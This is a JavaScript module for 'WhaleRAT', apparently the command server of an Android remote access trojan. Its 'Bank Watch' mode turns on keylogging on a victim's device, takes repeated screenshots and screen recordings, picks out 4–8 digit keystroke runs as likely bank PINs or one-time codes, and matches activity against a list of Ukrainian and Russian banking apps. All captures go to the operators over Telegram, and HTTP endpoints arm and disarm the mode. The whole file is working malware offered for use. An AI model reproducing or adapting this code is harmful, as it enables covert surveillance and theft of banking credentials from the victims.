'use strict';
/**
 * WhaleRAT — Bank Watch
 * Пока режим включён: циклические скриншоты + короткие записи экрана,
 * всё автоматически уходит админам в Telegram.
 * Параллельно включён кейлоггер: последовательности из 4-8 цифр
 * (нажатия на цифровую клавиатуру банка) летят отдельным алертом "Possible PIN".
 */

const fs = require('fs');
const path = require('path');

module.exports = function bankwatch(wr) {
  const { devices, sendCommand, bot, ADMIN_IDS, uploadDir, app, requireAuth } = wr;

  const ARM_MINUTES   = 15;    // окно слежения по умолчанию
  const SHOT_EVERY_MS = 6000;  // период скриншотов
  const REC_EVERY     = 5;     // каждая 5-я итерация — запись экрана
  const REC_SECONDS   = 12;

  // Пакеты банков UA/RU — для распознавания банка в логах и уведомлениях
  const BANK_PKGS = [
    'monobank','privatbank','ap24','oschadbank','ukrsibbank','raiffeisen','pumb',
    'abank','sense','alfabank','otpbank','ideabank','kredobank','pravex','agroprosperis',
    'sberbank','tinkoff','tbank','vtb','gazprombank','sovcombank','rosbank','otkritie',
    'psbank','openbank','mkb','uralsib','akbars','bank','банк','banking'
  ];

  const armed = new Map();

  const esc = s => String(s == null ? '' : s).replace(/[&<>]/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;' }[c]));
  const label = dev => (dev && (dev.nickname || dev.model)) || 'Unknown device';

  function notify(dev, html) {
    ADMIN_IDS.forEach(id =>
      bot.sendMessage(id, html, { parse_mode: 'HTML' }).catch(() => {}));
  }

  function sendMedia(url, kind, caption) {
    const file = path.join(uploadDir, path.basename(url || ''));
    if (!fs.existsSync(file)) return;
    const body = caption + '\n🕒 ' + new Date().toLocaleString('ru-RU');
    ADMIN_IDS.forEach(id => {
      const p = kind === 'photo'
        ? bot.sendPhoto(id, file, { caption: body })
        : bot.sendDocument(id, file, { caption: body });
      p.catch(() => {});
    });
  }

  function schedule(uuid, ms) {
    const st = armed.get(uuid);
    if (!st) return;
    clearTimeout(st.timer);
    st.timer = setTimeout(() => tick(uuid), ms);
  }

  function tick(uuid) {
    const st = armed.get(uuid);
    if (!st) return;
    if (Date.now() > st.deadline) return stop(uuid);

    const dev = devices.get(uuid);
    if (!dev || !dev.ws) return schedule(uuid, 5000);   // оффлайн — ждём

    st.tick++;
    sendCommand(uuid, { action: 'screenshot' });
    setTimeout(() => collectShot(uuid), 3500);

    if (st.tick % REC_EVERY === 0) {
      sendCommand(uuid, { action: 'record_screen', duration: REC_SECONDS });
      setTimeout(() => collectRec(uuid), (REC_SECONDS + 5) * 1000);
    }

    scanKeylog(uuid);
    schedule(uuid, SHOT_EVERY_MS);
  }

  function collectShot(uuid) {
    const st = armed.get(uuid); if (!st) return;
    const dev = devices.get(uuid); if (!dev) return;
    const url = dev.latestScreenshot;
    if (!url || url === st.seenShot) return;
    st.seenShot = url; st.shots++;
    sendMedia(url, 'photo', `📸 ${label(dev)}`);
  }

  function collectRec(uuid) {
    const st = armed.get(uuid); if (!st) return;
    const dev = devices.get(uuid); if (!dev) return;
    const list = dev.screenRecordGallery || [];
    while (st.seenRec < list.length) {
      const rec = list[st.seenRec++];
      st.recs++;
      sendMedia(rec.url, 'video', `🎥 ${label(dev)} · screen recording`);
    }
  }

  function scanKeylog(uuid) {
    const st = armed.get(uuid); if (!st) return;
    const dev = devices.get(uuid);
    if (!dev || !Array.isArray(dev.logs)) return;
    if (dev.logs.length < st.cursor) st.cursor = 0;

    const fresh = dev.logs.slice(st.cursor);
    st.cursor = dev.logs.length;

    const flush = () => {
      if (st.run.length >= 4 && st.run.length <= 8 && !st.pins.has(st.run)) {
        st.pins.add(st.run);
        const bank = BANK_PKGS.some(p => (dev.lastBankHit || '').includes(p));
        notify(dev, `🔑 <b>Possible PIN / OTP</b>${bank ? ' · bank app detected' : ''}\n` +
          `${esc(label(dev))}\n<code>${st.run}</code>`);
      }
      st.run = '';
    };

    for (const line of fresh) {
      const raw = String(line).trim();
      const tail = raw.replace(/^(clicked|focused|typing|input|click)\s*[:\-]?\s*/i, '').trim();

      if (/^\d$/.test(tail)) { st.run += tail; continue; }

      flush();

      const m = raw.match(/\b(\d{4,8})\b/);
      if (m && !st.pins.has(m[1])) {
        st.pins.add(m[1]);
        notify(dev, `🔑 <b>Possible PIN / OTP</b>\n${esc(label(dev))}\n<code>${m[1]}</code>`);
      }
      if (BANK_PKGS.some(p => raw.toLowerCase().includes(p))) dev.lastBankHit = raw.toLowerCase();
    }
  }

  function start(uuid, minutes) {
    const dev = devices.get(uuid);
    if (!dev) return { error: 'device not found' };
    if (armed.has(uuid)) stop(uuid, true);

    const st = {
      uuid, tick: 0, shots: 0, recs: 0, pins: new Set(), run: '',
      cursor: (dev.logs || []).length,
      seenShot: dev.latestScreenshot || null,
      seenRec: (dev.screenRecordGallery || []).length,
      startedAt: Date.now(),
      deadline: Date.now() + Math.max(1, minutes || ARM_MINUTES) * 60000
    };
    armed.set(uuid, st);

    sendCommand(uuid, { action: 'keylog_on' });
    dev.keylogEnabled = true;
    notify(dev, `👁 <b>BANK WATCH ARMED</b>\n${esc(label(dev))}\nОкно: ${minutes || ARM_MINUTES} мин`);
    tick(uuid);
    return { ok: true };
  }

  function stop(uuid, silent) {
    const st = armed.get(uuid);
    if (!st) return { ok: true };
    clearTimeout(st.timer);
    armed.delete(uuid);

    const dev = devices.get(uuid);
    if (dev) {
      sendCommand(uuid, { action: 'keylog_off' });
      dev.keylogEnabled = false;
    }
    if (!silent) {
      notify(dev, `🛑 <b>BANK WATCH DISARMED</b>\n${esc(dev ? label(dev) : uuid)}\n` +
        `Скриншотов: ${st.shots} · Записей: ${st.recs} · PIN-хитов: ${st.pins.size}`);
    }
    return { ok: true };
  }

  app.post('/api/bankwatch/arm', requireAuth, (req, res) => {
    const uuid = (req.body && req.body.uuid) || req.query.uuid;
    if (!uuid) return res.status(400).json({ error: 'missing uuid' });
    const minutes = parseInt((req.body && req.body.minutes) || req.query.minutes, 10) || ARM_MINUTES;
    res.json(start(uuid, minutes));
  });

  app.post('/api/bankwatch/disarm', requireAuth, (req, res) => {
    const uuid = (req.body && req.body.uuid) || req.query.uuid;
    if (!uuid) return res.status(400).json({ error: 'missing uuid' });
    res.json(stop(uuid));
  });

  app.get('/api/bankwatch/status', requireAuth, (req, res) => {
    res.json({ armed: [...armed.keys()] });
  });
};
